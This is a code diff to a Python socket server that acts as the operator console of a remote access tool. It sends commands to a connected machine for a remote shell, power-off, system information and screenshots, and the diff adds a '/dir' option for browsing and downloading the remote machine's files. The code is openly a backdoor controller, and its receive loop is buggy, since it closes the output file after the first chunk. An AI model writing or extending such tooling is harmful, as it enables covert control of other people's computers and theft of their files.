@@ -1,5 +1,5 @@
 import socket, sys
-
+import os
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 host = '0.0.0.0'
 port = 81
@@ -8,7 +8,7 @@ s.listen(1)
 conn, addr = s.accept()
 while True:
 
-    a = input('/cmd - Сommand line\n/mkdir - Make directory\n/poff - Power off\n/sysinfo - system information\n/screen - ScreenShot\n> ')
+    a = input('/cmd - Сommand line\n/mkdir - Make directory\n/poff - Power off\n/sysinfo - system information\n/dir - (Files, Download)\n/screen - ScreenShot\n> ')
     conn.send(a.encode())
 
     if a == '/cmd':
@@ -22,10 +22,50 @@ while True:
         dir = input('Name directory > ')
         conn.send(dir.encode())
 
+    elif a == "/dir":
+        cmd = input('1. Файли 2. Скачати > ')
+        if cmd == '1':
+            conn.send(cmd.encode())
+            direct = input('1. Наявня папка 2. Перейти >')
+            if direct == '1':
+                conn.send(cmd.encode())
+                f = open('file.txt', 'wb')
+                while True:
+                    try:
+                        data = conn.recv(1024)
+                        if data == 'EOF'.encode():
+                            break
+                        f.write(data)
+                        f.close()
+                    except:
+                        break
+
+                f = open('file.txt', 'r')
+                print(f.read())
+                f.close()
+                os.remove('file.txt')
+
+            elif direct == '2':
+                conn.send(cmd.encode())
+                dir = input('Enter directory > ')
+                conn.send(dir.encode())
+                f = open('file.txt', 'wb')
+
+                while True:
+                    try:
+                        data = conn.recv(1024)
+                        if data == 'EOF'.encode():
+                            break
+                        f.write(data)
+                        f.close()
+                    except:
+                        break
+                f = open('file.txt', 'r')
+                print(f.read())
+                f.close()
+                os.remove('file.txt')
+                
     elif a == '/sysinfo':
         sysinfo = conn.recv(5000)
         sysinfo = str(sysinfo, 'cp866')
         print(sysinfo)
-
-    elif a == '/webcam':
-        pass
